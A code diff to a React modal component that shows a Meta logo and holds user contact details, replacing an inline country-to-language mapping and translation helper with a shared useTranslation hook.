@@ -1,7 +1,7 @@
 'use client';
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
-import { getTranslations } from '@/utils/translate';
+import { useTranslation } from '@/utils/use-translation';
 import { store } from '@/store/store';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
@@ -50,24 +50,8 @@ const InitModal: FC = () => {
     });
 
     const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
+    const { t } = useTranslation();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
-    
-    // Get language from country code or default to English
-    const countryToLanguage: Record<string, string> = {
-        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
-        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
-        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
-        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
-        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
-        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
-        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
-    };
-    const language = countryToLanguage[countryCode] || 'en';
-    const translations = getTranslations(language);
-
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
 
     const initOptions = useMemo(
         () => ({
